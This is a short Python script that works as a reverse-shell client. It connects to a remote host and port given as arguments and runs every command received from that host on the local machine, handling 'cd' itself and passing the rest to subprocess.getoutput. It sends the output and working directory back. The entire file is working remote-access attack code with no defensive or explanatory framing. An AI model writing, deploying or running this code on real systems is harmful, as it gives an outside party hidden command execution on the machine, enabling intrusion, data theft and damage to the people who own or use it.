import socket
import select 
import sys 
import os
import subprocess

# create a socket object
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 

# get local machine name
host = sys.argv[1]                     

port = int(sys.argv[2])

buff = 1024 * 128
sep = "<sep>"
# connection to hostname on the port.
s.connect((host, port)) 
#gets the current working directory                              
wd = os.getcwd()
s.send(wd.encode())

  
while True: 
  
    # maintains a list of possible input streams 
    sockets_list = [sys.stdin, s] #creates List of socket objects to read or write s and sys.stdin
  
    read_sockets,write_socket, error_socket = select.select(sockets_list,[],[]) #unix specific using select system call. waiting to read from socket. 
  
    for socks in read_sockets: 
        if socks == s: 
            cmd = s.recv(buff).decode() #Opens socket to recieve byte data and sets buffer size.
            split = cmd.split()
            
            if cmd.lower() == "exit":
            # if the cmd is exit, break loop. seems to have a bug?
                break
            if split[0].lower() == "cd":
            # cd command, change directory
                try:
                    os.chdir(' '.join(split[1:]))
                except FileNotFoundError as e:
            # if error, set as output
                    output = str(e)
                else:
            # if successful, output empty message
                    output = ""
            else:
            # execute cmd and get results
                output = subprocess.getoutput(cmd)
            wd = os.getcwd()
            # send results to server
            message = f"{output}{sep}{wd}"
            s.send(message.encode())                                       

s.close()


